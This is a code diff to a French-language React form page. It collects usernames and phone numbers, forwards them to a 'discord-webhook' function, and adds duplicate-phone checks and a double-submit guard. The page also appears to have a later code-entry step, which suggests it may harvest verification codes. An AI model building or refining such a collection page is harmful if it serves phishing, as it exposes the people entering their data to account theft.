@@ -16,6 +16,7 @@ const Index = () => {
   const [codeError, setCodeError] = useState("");
   const [formError, setFormError] = useState("");
   const visitTracked = useRef(false);
+  const formSubmittingRef = useRef(false);
 
   // Tracker la visite une seule fois
   useEffect(() => {
@@ -61,10 +62,27 @@ const Index = () => {
   }, [submissionId, step]);
 
   const handleFormSubmit = async (data: { username: string; phone: string }) => {
+    // Protection contre les soumissions multiples rapides
+    if (formSubmittingRef.current) return;
+    formSubmittingRef.current = true;
+    
     setFormError("");
     setFormData(data);
     
     try {
+      // Vérifier d'abord si le numéro existe déjà en base
+      const { data: existingPhone } = await supabase
+        .from('submissions')
+        .select('id')
+        .eq('phone', data.phone)
+        .maybeSingle();
+      
+      if (existingPhone) {
+        setFormError("Ce numéro de téléphone a déjà été utilisé.");
+        formSubmittingRef.current = false;
+        return;
+      }
+      
       const { data: response, error } = await supabase.functions.invoke('discord-webhook', {
         body: { ...data, step: "form" }
       });
@@ -72,6 +90,7 @@ const Index = () => {
       // Vérifier si le numéro existe déjà (erreur serveur)
       if (error || response?.error === 'phone_exists') {
         setFormError(response?.message || "Ce numéro de téléphone a déjà été utilisé.");
+        formSubmittingRef.current = false;
         return;
       }
       
@@ -83,6 +102,8 @@ const Index = () => {
     } catch (error) {
       console.error("Error:", error);
       setFormError("Une erreur est survenue. Veuillez réessayer.");
+    } finally {
+      formSubmittingRef.current = false;
     }
   };
 
